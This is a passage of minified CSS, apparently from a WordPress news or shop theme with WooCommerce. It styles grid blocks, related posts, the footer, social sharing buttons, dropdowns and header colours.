.td_module_mx26,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx26{padding-top:23%}}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx25{padding-top:11%}@media (min-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 .td_module_mx26 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx26 .entry-title{font-size:19px;line-height:24px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 .td_module_mx26 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx26 .td-meta-info-container{padding:0 20px 18px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 .td_module_mx25 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx25 .entry-title{font-size:17px;line-height:22px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx25 .td-meta-info-container{padding:0 20px 18px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx26 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx26 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx26 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx26 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx26 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx26 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx26 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-2 .td_module_mx26 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx26 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-3 .td_module_mx26 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx26 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-7 .td_module_mx26 .td-module-meta-info{padding-left:20px;padding-right:20px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9.td-grid-style-4 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9.td-grid-style-4 .td_module_mx25 .td-meta-info-container{width:auto;max-width:80%}}@media (min-width:1019px) and (max-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx25{padding-top:15%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 .td_module_mx25 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx25 .entry-title{font-size:15px;line-height:20px}}.td_block_big_grid_fl_10 .td_module_mx25{width:24.5%;padding-top:18%}@media (min-width:767px){.td_block_7 .td-load-more-wrap,.td_block_7 .td-next-prev-wrap{margin-top:26px}.td_block_big_grid_fl_9 .td_module_mx25 .entry-title{font-size:13px;line-height:18px}.td_block_big_grid_fl_9 .td_module_mx25 .td-post-category{margin-bottom:10px}.td_block_big_grid_fl_9 .td_module_mx25 .td-meta-info-container{padding:0 10px 13px}.td_block_big_grid_fl_10 .td_module_mx25 .entry-title{font-size:13px;line-height:18px}.td_block_big_grid_fl_10 .td_module_mx25 .td-meta-info-container{padding:0 10px 13px}.td_block_big_grid_fl_10.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td_block_big_grid_fl_10.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td_block_big_grid_fl_10.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td_block_big_grid_fl_10.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td_block_big_grid_fl_10.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td_block_big_grid_fl_10.td-grid-style-7 .td_module_mx25 .td-module-meta-info{padding-left:10px;padding-right:10px}}.td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25{width:100%}@media (min-width:1018px){.td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25{padding-top:73.5%}}@media (min-width:768px) and (max-width:1018px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_9 .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_9 .td_module_mx25{padding-top:17%}.td_block_big_grid_fl_10 .td_module_mx25{padding-top:21%}.td_block_big_grid_fl_10 .td_module_mx25 .entry-title{font-size:12px!important;line-height:15px!important}.td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25{padding-top:85.7%}}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td_module_mx25{padding-top:13%}@media (min-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td_module_mx25 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td_module_mx25 .entry-title{font-size:17px;line-height:22px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td_module_mx25 .td-meta-info-container{padding:0 17px 18px}}@media (min-width:1019px) and (max-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td_module_mx25{padding-top:17.52%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td_module_mx25 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td_module_mx25 .entry-title{font-size:15px;line-height:20px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td_module_mx25 .td-meta-info-container{padding:0 10px 18px}}@media (min-width:768px) and (max-width:1018px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td_module_mx25{padding-top:23%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td_module_mx25 .entry-title,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td_module_mx25 .entry-title{font-size:13px!important;line-height:18px!important}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td_module_mx25 .td-meta-info-container{padding:0 10px 13px}}@media (min-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25{padding-top:53%}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-7 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-7 .td_module_mx25 .td-module-meta-info{padding-left:17px;padding-right:17px}.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-4 .td_module_mx25 .td-meta-info-container,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-4 .td_module_mx25 .td-meta-info-container{width:auto;max-width:90%}}@media (min-width:768px) and (max-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10.td-grid-style-7 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-2 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-2 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-3 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-3 .td_module_mx25 .td-module-meta-info,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-7 .td_module_mx25 .td-big-grid-meta,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10.td-grid-style-7 .td_module_mx25 .td-module-meta-info{padding-left:10px;padding-right:10px}}.td-related-row{margin-right:-21px}.td-related-row:after,.td-related-row:before{display:table;content:''}.td-related-row:after{clear:both}.td-related-row [class*=td-related-span]{display:block;min-height:1px;float:left;padding-right:24px;padding-left:24px}@media (min-width:1019px) and (max-width:1140px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25{padding-top:71.5%}.td-related-row [class*=td-related-span]{padding-right:20px;padding-left:20px}}@media (min-width:768px) and (max-width:1018px){.td-full-layout .td-category-grid-fl .td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25,.td-full-layout .td-stretch-content .td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25{padding-top:93.9%}.td-related-row [class*=td-related-span]{padding-right:14px;padding-left:14px}}@media (max-width:767px){.td_block_big_grid_fl_10 .td_module_mx25{width:100%}.td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25{float:left}.td_block_big_grid_fl_10 .td-big-grid-column .td_module_mx25:first-child{margin-bottom:3px}.td-related-row [class*=td-related-span]{padding-right:0;padding-left:0;float:none;width:100%}}.td-related-row .td-related-span4{width:33.33333333%;padding-left:0;padding-right:21px}@media (max-width:500px){.td-related-row .td-related-span4{padding-right:10px}.td-related-row{margin-right:-10px}}.td_block_related_posts{position:relative}.td_block_related_posts .td-module-thumb{margin-bottom:7px}.td_block_related_posts .td-module-title{font-family:var(--td_default_google_font_2,'Roboto',sans-serif);font-weight:500;font-size:13px;line-height:20px;margin-top:0}@media (max-width:767px){.td_block_related_posts .td-module-thumb{margin-bottom:0}.td_block_related_posts .td-module-title{font-size:17px;line-height:23px}.td_block_related_posts .td-related-span4{width:100%}.td_block_related_posts .td-module-image{position:absolute;width:100px}.td_block_related_posts .item-details{padding-left:110px;min-height:70px;margin-bottom:26px}.td-related-title>.td-related-right{margin-right:0!important}}.td_block_related_posts .td-next-prev-wrap{margin-top:0}.td_block_template_1 .td-related-title{border-bottom:2px solid var(--td_theme_color,#4db2ec)}.td_block_template_1 .td-related-title a{line-height:1;padding:9px 12px 5px}@media (max-width:319px){.td_block_template_1 .td-related-title a{width:100%;font-size:12px!important}}.td_block_template_1 .td-related-title .td-cur-simple-item{background-color:var(--td_header_color,#222);color:#fff}.td_block_template_1 .td-related-title .td-cur-simple-item:hover{color:#fff}.td-related-title{font-family:var(--td_default_google_font_2,'Roboto',sans-serif);font-size:14px;line-height:1;margin-top:0;margin-bottom:27px}.td-related-title>.td-related-left,.td-related-title>.td-related-right{display:inline-block;white-space:nowrap}@media (max-width:320px){.td-related-title>.td-related-left,.td-related-title>.td-related-right{font-size:13px!important}}@-moz-document url-prefix(){.td_block_template_1 .td-related-title>.td-related-left,.td_block_template_1 .td-related-title>.td-related-right{padding:8px 12px 6px}}.td_mod_related_posts:hover h3>a{color:var(--td_theme_color,#4db2ec)}.td-parallax-header{margin-bottom:60px}@media (min-width:768px) and (max-width:1018px){.td-parallax-header{margin-bottom:36px}}@media (max-width:767px){.td-parallax-header{margin-bottom:25px}}.wpb_video_wrapper{margin-bottom:26px}.wpb_video_wrapper iframe{display:block}.wpb_video_wrapper video{max-width:100%}.td-full-screen-header-image-wrap{position:relative;overflow:hidden}#td-full-screen-header-image{top:0;right:0;left:0;z-index:0;height:100%;text-align:center}.td-pulldown-filter-list{display:none}.td-category-header .td-icon-menu-down{font-size:9px;margin-left:5px;position:relative;top:-1px}.td-category-siblings{z-index:2;opacity:0;width:744px;position:relative}@media (min-width:768px) and (max-width:1018px){.td-category-siblings{width:560px}}.td-category-siblings .td-category{display:inline-block;vertical-align:top;height:20px;overflow:hidden}.td-js-loaded .td-category-siblings{opacity:1;-webkit-transition:opacity .3s;transition:opacity .3s}@media (max-width:767px){.td-category-siblings{margin-right:0;width:auto}.category .td-crumb-container{margin-bottom:3px;padding-top:15px}.category .td-main-content .td-load-more-wrap{margin-bottom:26px}.td-more-articles-box{display:none!important}}.td-more-articles-box{-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0);position:fixed;width:341px;bottom:48px;right:-384px;background-color:#fff;padding:16px 20px 0;border-style:solid;border-color:var(--td_grid_border_color,#ededed);border-width:1px 0 1px 1px;z-index:9999;visibility:hidden;-webkit-transition:.5s cubic-bezier(.265, .365, .26, .865);-moz-transition:.5s cubic-bezier(.265, .365, .26, .865);-o-transition:.5s cubic-bezier(.265, .365, .26, .865);transition:all .5s cubic-bezier(.265, .365, .26, .865)}.td-close-more-articles-box{display:inline-block;cursor:pointer;position:absolute;left:14px;top:21px;line-height:26px;padding:2px 11px;font-size:17px}.td-front-end-display-block{right:0;visibility:visible}.td-footer-wrapper{background-color:#222;padding-top:54px;padding-bottom:20px;color:#eaeaea;position:relative}@media (min-width:768px) and (max-width:1018px){.td-footer-wrapper{padding-top:44px}}.td-footer-wrapper .td_block_wrap{padding-bottom:0;margin-bottom:48px;transform:translate3d(0,0,0);-webkit-transform:translate3d(0,0,0)}@media (max-width:767px){.td-footer-wrapper{padding-top:40px}.td-footer-wrapper .td_block_wrap{margin-bottom:38px}}.td-footer-wrapper .td_block_wrap .td-block-span12:last-child .td_module_wrap{padding-bottom:0}.td-footer-wrapper:before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background-repeat:no-repeat;background-size:auto;background-position:center bottom;transform:translateZ(0);-webkit-transform:translateZ(0)}.td-footer-wrapper .block-title a,.td-footer-wrapper .block-title label,.td-footer-wrapper .block-title span{background-color:transparent;color:#fff;padding:6px 0 5px;line-height:1}.td-footer-wrapper .block-title{border-bottom:0;font-size:18px;font-weight:700;margin-bottom:30px;margin-top:2px}.td-footer-wrapper a{color:#fff}.td-footer-wrapper ul{margin-bottom:0}.td-footer-wrapper li{margin-left:0}.td-footer-wrapper .widget_categories li span{margin-right:0}.td-footer-info{margin-bottom:48px}@media (max-width:767px){.td-footer-wrapper .block-title{margin-bottom:21px}.td-footer-wrapper .widget .block-title{margin-bottom:13px}.td-footer-wrapper .td-pb-span4{margin-bottom:38px}.td-footer-wrapper .td-pb-span4:last-child{margin-bottom:0}.td-footer-info{margin-bottom:38px;text-align:center}.footer-logo-wrap img{max-width:70%}}.td-footer-info .footer-text-wrap a{color:var(--td_theme_color,#4db2ec)}.td-footer-info .footer-text-wrap a:hover{text-decoration:underline}.footer-logo-wrap{margin-bottom:20px}.footer-text-wrap{font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif)}.td-social-style-2 .td-social-icon-wrap{display:inline-block;margin:5px 10px 10px 0}.td-social-style-2 .td-social-icon-wrap:last-child{margin-right:0}.td-social-style-2 .td-icon-font{font-size:14px;width:40px;height:40px;line-height:40px;background-color:rgba(255,255,255,.03);position:relative}.td-social-style-2 .td-icon-font:after{content:'';width:100%;height:100%;position:absolute;top:0;left:0;border:1px solid #fff;opacity:.03}@media (min-width:768px) and (max-width:1018px){.td-social-style-2 .td-icon-font{font-size:12px;width:32px;height:32px;line-height:32px}}.td-footer-template-2 .footer-logo-wrap{padding-top:3px}.td-block-title a,.td-block-title span{display:inline-block}.td_block_template_1 .block-title{text-align:left}body div .tdb-s-form-select-wrap .select2-hidden-accessible{display:none}body div .tdb-s-form-select-wrap .select2-selection{display:flex;align-items:center;padding:5px 15px 6px;width:100%;min-height:44px;height:auto;font-size:1em;line-height:1.3;font-weight:600;color:#444;border:2px solid #d7d8de;border-radius:5px;outline:transparent solid 3px;cursor:pointer;transition:border-color .2s ease-in-out,color .2s ease-in-out,outline-color .2s ease-in-out}body div .tdb-s-form-group:not(.tdb-s-fg-error) .select2-container--open .select2-selection{border-color:#0489fc!important;outline-width:3px;outline-style:solid;outline-color:rgba(4,137,252,.1)}body div .tdb-s-fg-error .tdb-s-form-select-wrap .select2-selection{border-color:red!important;outline:rgba(255,0,0,.1) solid 3px}body div .tdb-s-form-group-sm .tdb-s-form-select-wrap .select2-selection{height:36px;font-size:.929em}body .tdb-s-select2 .select2-results,body .tdb-s-select2 .select2-search,body .tdb-s-select2.select2-dropdown,body>.select2-container{display:block}body>.select2-container{z-index:10005}body.admin-bar .tdb-s-select2.select2-dropdown{margin-top:36px}body .tdb-s-select2.select2-dropdown{margin-top:4px;background-color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;font-size:14px;border:2px solid #d7d8de;border-radius:5px;outline-width:3px;outline-style:solid;outline-color:rgba(215,216,222,.18)}body .tdb-s-select2 .select2-search{padding:6px}body .tdb-s-select2 .select2-search__field{padding:0 10px 2px;width:100%;height:36px;min-height:36px;font-size:.929em;line-height:1.3;font-weight:600;color:#444;border:2px solid #d7d8de;border-radius:5px;outline:transparent solid 3px;box-shadow:none;transition:border-color .2s ease-in-out,color .2s ease-in-out,outline-color .2s ease-in-out;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:border-box}body .tdb-s-select2 .select2-results__options{list-style-type:none;margin:0;padding:0 0 4px;max-height:277px;font-size:.929em;font-weight:600;color:#444;overflow-y:auto}body .tdb-s-select2 .select2-results__options li{margin:0;padding:2px 10px 4px;cursor:pointer}body .tdb-s-select2 .select2-results__options li:hover{background-color:#f8f8f8}.clearfix:after,.clearfix:before{display:table;content:'';line-height:0}.clearfix:after{clear:both}.no-js .elastislide-list{display:block}.woocommerce{font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);font-size:15px}.woocommerce th{border:none;background-color:transparent!important}.woocommerce nav li{margin:0;list-style:none}.woocommerce nav ul{margin:0}.td-woo-default .select2-selection{height:auto;padding:3px 0;border-radius:0;border-color:#e1e1e1}#customer_login h2{font-size:1.4em;font-weight:600;margin:0}#customer_login form{margin-top:10px;border-radius:0;border-color:rgba(0,0,0,.1)}:root{--accent-color:#fff}body{background-color:#f4f4f4}:root{--td_header_color:#1e73be;--td_mobile_menu_color:#1e73be;--td_mobile_gradient_one_mob:#dd9933;--td_mobile_gradient_two_mob:#1e73be;--td_page_title_color:#dd9933;--td_page_h_color:#1e73be}.td-header-wrap .top-header-menu .sub-menu{background-color:#1e73be}.td-header-menu-wrap.td-affix,.td-header-wrap .td-header-menu-wrap-full{background-color:#fff}.sf-menu>.current-menu-item>a:after,.sf-menu>.sfHover>a:after,.sf-menu>li:hover>a:after{background-color:#1e73be}.header-search-wrap .td-drop-down-search:before{border-color:transparent transparent #1e73be}.td-theme-wrap .sf-menu ul .current-menu-item>a,.td-theme-wrap .sf-menu ul .sfHover>a,.td-theme-wrap .sf-menu ul .td-menu-item>a:hover{color:#1e73be}.td-header-wrap .header-search-wrap #td-header-search-button .td-icon-search,.td-header-wrap .td-header-menu-wrap .sf-menu>li>a{color:#1e73be}.td-footer-wrapper{background-color:rgba(0,0,0,.57)}.td-sub-footer-container{background-color:#000}.td-footer-wrapper .block-title>a,.td-footer-wrapper .block-title>span,.td-theme-wrap .td-footer-wrapper .td-container .td-block-title>*{color:#6394bf}.td-post-sharing-classic{position:relative;height:20px}.td-post-sharing{margin-left:-3px;margin-right:-3px;font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);z-index:2;white-space:nowrap;opacity:0}.td-post-sharing.td-social-show-all{white-space:normal}.td-js-loaded .td-post-sharing{-webkit-transition:opacity .3s;transition:opacity .3s;opacity:1}.td-post-sharing-classic+.td-post-sharing{margin-top:15px}.td-post-sharing-top{margin-bottom:30px}@media (max-width:767px){.td-footer-template-2{padding-top:38px;padding-bottom:10px}.td-post-sharing-classic+.td-post-sharing{margin-top:8px}.td-post-sharing-top{margin-bottom:20px}}.td-post-sharing-bottom{border-style:solid;border-color:#ededed;border-width:1px 0;padding:21px 0;margin-bottom:42px}.td-post-sharing-bottom .td-post-sharing{margin-bottom:-7px}.td-post-sharing-visible,.td-social-sharing-hidden{display:inline-block}.td-social-sharing-hidden ul{display:none}.td-social-show-all .td-pulldown-filter-list{display:inline-block}.td-social-handler,.td-social-network{position:relative;display:inline-block;margin:0 3px 7px;height:40px;min-width:40px;font-size:11px;text-align:center;vertical-align:middle}.td-ps-notext .td-social-handler .td-social-but-icon,.td-ps-notext .td-social-network .td-social-but-icon{border-top-right-radius:2px;border-bottom-right-radius:2px}.td-social-network{color:#000;overflow:hidden}.td-social-network .td-social-but-icon{border-top-left-radius:2px;border-bottom-left-radius:2px}.td-social-network .td-social-but-text{border-top-right-radius:2px;border-bottom-right-radius:2px}.td-social-network:hover{opacity:.8!important}.td-social-handler{color:#444;border:1px solid #e9e9e9;border-radius:2px}.td-social-handler .td-social-but-text{font-weight:700}.td-social-handler .td-social-but-text:before{background-color:#000;opacity:.08}.td-social-share-text{margin-right:18px}.td-social-share-text:after,.td-social-share-text:before{content:'';position:absolute;top:50%;-webkit-transform:translateY(-50%);transform:translateY(-50%);left:100%;width:0;height:0;border-style:solid}.td-social-share-text:before{border-width:9px 0 9px 11px;border-color:transparent transparent transparent #e9e9e9}.td-social-share-text:after{border-width:8px 0 8px 10px;border-color:transparent transparent transparent #fff}.td-social-but-icon,.td-social-but-text{display:inline-block;position:relative}.td-social-but-icon{padding-left:13px;padding-right:13px;line-height:40px;z-index:1}.td-social-but-icon i{position:relative;top:-1px;vertical-align:middle}.td-social-but-text{margin-left:-6px;padding-left:12px;padding-right:17px;line-height:40px}.td-social-but-text:before{content:'';position:absolute;top:12px;left:0;width:1px;height:16px;background-color:#fff;opacity:.2;z-index:1}.td-social-facebook i,.td-social-handler i{font-size:14px}.td-social-mail i,.td-social-print i{font-size:15px}.td-social-twitter .td-icon-twitter{font-size:14px}.td-social-pinterest .td-icon-pinterest{font-size:13px}.td-social-whatsapp .td-icon-whatsapp{font-size:18px}.td-social-copy_url{position:relative}.td-social-copy_url-disabled{pointer-events:none}.td-social-expand-tabs i{top:-2px;left:-1px;font-size:16px}.td-ps-bg .td-social-network{color:#fff}.td-ps-bg .td-social-facebook .td-social-but-icon,.td-ps-bg .td-social-facebook .td-social-but-text{background-color:#516eab}.td-ps-bg .td-social-twitter .td-social-but-icon,.td-ps-bg .td-social-twitter .td-social-but-text{background-color:#29c5f6}.td-ps-bg .td-social-pinterest .td-social-but-icon,.td-ps-bg .td-social-pinterest .td-social-but-text{background-color:#ca212a}.td-ps-bg .td-social-whatsapp .td-social-but-icon,.td-ps-bg .td-social-whatsapp .td-social-but-text{background-color:#7bbf6a}.td-ps-bg .td-social-copy_url .td-social-but-icon,.td-ps-bg .td-social-copy_url .td-social-but-text,.td-ps-bg .td-social-mail .td-social-but-icon,.td-ps-bg .td-social-mail .td-social-but-text{background-color:#000}.td-ps-bg .td-social-print .td-social-but-icon,.td-ps-bg .td-social-print .td-social-but-text{background-color:#333}.td-ps-notext .td-social-but-icon{width:40px}.td-ps-notext .td-social-network .td-social-but-text{display:none}@media (max-width:767px){.td-post-sharing-style1 .td-social-share-text .td-social-but-text{display:none!important}}.tdi_5.td-a-rec{text-align:center}.tdi_5.td-a-rec:not(.td-a-rec-no-translate){transform:translateZ(0)}.tdi_6.td-a-rec{text-align:center}.tdi_6.td-a-rec:not(.td-a-rec-no-translate){transform:translateZ(0)}.td_block_popular_categories{padding-bottom:0}@media screen and (min-width:720px){.woocommerce img{border-radius:10px}}.sf-menu .td-icon-menu-down{position:absolute;top:50%;margin-top:-5px;padding-left:7px;font-size:9px;right:10px}.td-mobile-content .td-icon-menu-right{display:none;position:absolute;cursor:pointer;top:36px;right:-4px;z-index:1000;font-size:14px;padding:6px 12px;float:right;color:#fff;-webkit-transform-origin:50% 48% 0px;transform-origin:50% 48% 0px;-webkit-transition:transform .3s;transition:transform .3s ease;transform:rotate(-90deg);-webkit-transform:rotate(-90deg)}.woocommerce div.product div.images img{box-shadow:rgba(0,0,0,.24) 0 3px 8px!important}.woocommerce ul.products li.product a img{box-shadow:rgba(0,0,0,.24) 0 3px 8px!important}.wp-block-image img{box-shadow:rgba(0,0,0,.24) 0 3px 8px!important}.td-post-template-default .td-post-featured-image img{box-shadow:rgba(0,0,0,.24) 0 3px 8px!important}::placeholder{color:#a2a2a2!important;font-size:small!important}.woocommerce .product .products h2:not(.woocommerce-loop-product__title){background-color:#fff!important}.woocommerce ul.products li.product .button{margin-top:0}form.woocommerce-ordering{display:none}.td-header-wrap>.td-header-menu-wrap-full>.td-header-menu-wrap>.td-container>.header-search-wrap{margin-bottom:0!important}.td-header-wrap>.td-header-menu-wrap-full>.td-header-menu-wrap>.td-affix>.header-search-wrap{margin-bottom:14px!important}.td-module-thumb .entry-thumb{display:block;box-shadow:rgba(99,99,99,.2) 0 2px 8px 0}.td-header-wrap>.td-header-menu-wrap-full>.td-header-menu-wrap>.td-container{width:100%}.td-header-wrap>.td-header-menu-wrap-full>.td-header-menu-wrap>.td-container>.header-search-wrap{margin-bottom:16px}.td-header-wrap>.td-header-menu-wrap-full>.td-header-menu-wrap>.td-container>.td-header-sp-logo{padding-right:0;margin-right:0;margin-left:50px}.td-header-wrap>.td-header-menu-wrap-full>.td-header-menu-wrap>.td-container>#td-header-menu>.td-main-menu-logo{padding-right:0!important;margin-right:0!important;margin-left:50px!important}.td-header-style-7 .td-header-sp-logo img{width:75%}.td-post-content li,.td-post-content p{font-family:Roboto;font-size:18px;line-height:26px;font-style:normal;color:#3a3a3a}.td-category a{background-color:#b2b2b2}header .td-post-date{color:#b2b2b2}header .td-post-author-name{color:#b2b2b2}.td-post-author-name a{color:#b2b2b2}.td-main-content-wrap{background-color:#fefefe}.post{background-color:#fefefe}.wc-block-components-notice-banner{align-content:flex-start;align-items:stretch;background-color:#fff;border:1px solid;border-radius:4px;box-sizing:border-box;color:#2f2f2f;display:flex;font-size:.875em;font-weight:400;gap:12px;line-height:1.5;margin:16px 